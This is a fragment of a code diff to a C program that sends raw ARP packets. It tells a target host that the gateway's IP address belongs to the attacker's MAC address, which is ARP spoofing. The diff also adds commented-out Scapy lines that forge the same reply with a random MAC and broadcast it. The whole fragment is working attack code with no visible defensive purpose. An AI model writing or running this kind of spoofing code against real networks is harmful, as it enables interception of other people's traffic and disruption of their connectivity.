@@ -110,10 +110,14 @@ int main(int argc, char *argv[]) {
     memcpy(eh->ether_dhost, bcast,   ETH_ALEN);
     eh->ether_type = htons(ETH_P_ARP);
     // ARP payload: target is host_mac
-    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN);
-    memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));
-    memcpy(arp->arp_tha, host_mac, ETH_ALEN);
-    memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));
+    memcpy(arp->arp_sha, atk_mac,  ETH_ALEN); /* sender hardware (MAC) address */
+    memcpy(&arp->arp_spa, &gw_ip, sizeof(gw_ip));/* sender protocol (IPv4) address */
+    memcpy(arp->arp_tha, bcast, ETH_ALEN);/* target hardware (MAC) address */
+    memcpy(&arp->arp_tpa, &host_ip, sizeof(host_ip));/* target protocol (IPv4) address */
+
+    //         arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
+       // sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+
     // send
     memcpy(sa.sll_addr, bcast, ETH_ALEN);
     if (sendto(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
